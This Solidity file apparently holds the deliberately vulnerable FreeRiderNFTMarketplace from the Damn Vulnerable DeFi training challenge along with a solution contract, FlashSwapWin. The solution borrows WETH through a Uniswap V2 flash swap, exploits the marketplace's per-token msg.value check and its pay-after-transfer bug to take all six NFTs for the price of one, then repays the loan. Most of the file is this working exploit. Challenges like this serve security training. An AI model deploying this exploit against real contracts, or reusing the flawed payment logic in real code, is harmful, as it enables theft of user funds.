// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

// import "../WETH9.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for (uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external
        nonReentrant
    {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
                token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds)
        external
        payable
        nonReentrant
    {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


contract FlashSwapWin is IUniswapV2Callee, IERC721Receiver {
    using Address for address;


    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable buyerMarketplace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    )  {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
        // deposit msg.value to weth
    }

    event Log(string message, uint256 val);

    // Intiate flash swap
    function flashSwap(address _tokenBorrow, uint256 _amount) external {

        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {

        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        // Decode custom data set in flashLoan()
        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        // Calculate Loan repayment
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));

        // Withdraw all WETH to ETH
        tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currBal));

        // Load uint256s (there is surely a better way to do this)
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Purchase all NFTs for the Price of 1
        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
            tokenIds
        );

        // Transfer newly attained NFTs to Buyer Contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        // Deposit ETH into WETH contract
        // ETH came from Buyer Contract + Marketplace exploit
        (bool success,) = weth.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        // Pay back Loan with deposited WETH funds
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive () external payable {}
}
